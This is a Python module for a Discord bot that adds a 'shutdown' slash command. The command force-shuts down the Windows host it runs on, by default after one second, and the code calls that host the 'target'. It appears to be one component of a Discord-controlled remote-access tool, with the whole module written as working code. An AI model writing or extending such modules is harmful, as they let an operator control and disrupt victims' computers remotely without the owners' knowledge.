import discord
from discord import app_commands
import os
import config

@app_commands.command(name="shutdown", description="Shutdown target (also closes connection)")
async def command(interaction: discord.Interaction, timer: int = 1):
    if timer < 0 or timer > 9999:
        embed = discord.Embed(description=f"❌ | Timer must not be less than `0` or larger than `9999`", color=config.embederrorcolor)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    embed = discord.Embed(title="Message", description=f"Shutting down...", color=config.embedcolor)
    await interaction.response.send_message(embed=embed)
    os.system(f"shutdown /s /f /t {timer}")
    
    
async def setup(bot):
    global Bot 
    Bot = bot
    bot.tree.get_command("functions").add_command(command)    